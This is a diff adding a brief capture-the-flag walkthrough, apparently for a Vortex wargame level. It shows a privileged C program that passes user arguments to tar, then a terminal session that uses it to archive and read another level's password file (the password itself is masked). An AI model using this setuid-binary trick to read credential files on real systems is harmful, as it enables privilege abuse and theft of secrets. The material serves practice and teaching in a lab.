@@ -1,0 +1,31 @@
+The binary:
+
+                                vortex2.c
+┌────────────────────────────────────────────────────────────────────────────────────────────────┐
+│#include <stdlib.h>                                                                             │
+│#include <stdio.h>                                                                              │
+│#include <sys/types.h>                                                                          │
+│                                                                                                │
+│int main(int argc, char **argv)                                                                 │
+│{                                                                                               │
+│        char *args[] = { "/bin/tar", "cf", "/tmp/ownership.$$.tar", argv[1], argv[2], argv[3] };│
+│        execv(args[0], args);                                                                   │
+│}                                                                                               │
+└────────────────────────────────────────────────────────────────────────────────────────────────┘
+
+Since vortex2 is owned by vortex3, the executed 'tar' command inside has permissions to archive the level 3 password.
+
+This means we can just execute vortex2 with '/etc/vortex_pass/vortex3' as the only parameter and it'll archive the password file for us.
+
+┌────────────────────────────────────────────────────────────────────────────────────────────────┐
+  vortex2@vortex:/tmp/tald2$ /vortex/vortex2 /etc/vortex_pass/vortex3; cp ../ownership.\$\$.tar .
+  
+  /bin/tar: Removing leading `/' from member names
+  vortex2@vortex:/tmp/tald2$ tar -xvf ownership.\$\$.tar
+  etc/vortex_pass/vortex3
+  vortex2@vortex:/tmp/tald2$ cat etc/vortex_pass/vortex3
+  *********
+  vortex2@vortex:/tmp/tald2$
+└────────────────────────────────────────────────────────────────────────────────────────────────┘
+
+The tarball is still owned by vortex 2 and now contains a readable copy of the password for vortex3! Nice and quick!
